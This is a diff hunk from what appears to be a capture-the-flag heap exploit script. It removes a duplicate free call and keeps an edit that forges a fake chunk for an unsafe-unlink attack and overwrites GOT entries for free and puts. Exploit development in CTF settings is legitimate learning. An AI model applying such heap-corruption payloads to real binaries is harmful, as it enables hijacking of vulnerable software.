@@ -28,7 +28,6 @@ def exp():
 	add(2, 'a')	
 	free(1)
 	hack()
-	free(1)
 	edit(1, p64(0)+p64(0x21)+p64(ptr-0x18)+p64(ptr-0x10)+p64(0x20))
 	free(2)
 	edit(1, p64(0)*3+p64(elf.got['free'])+p64(elf.got['puts']))
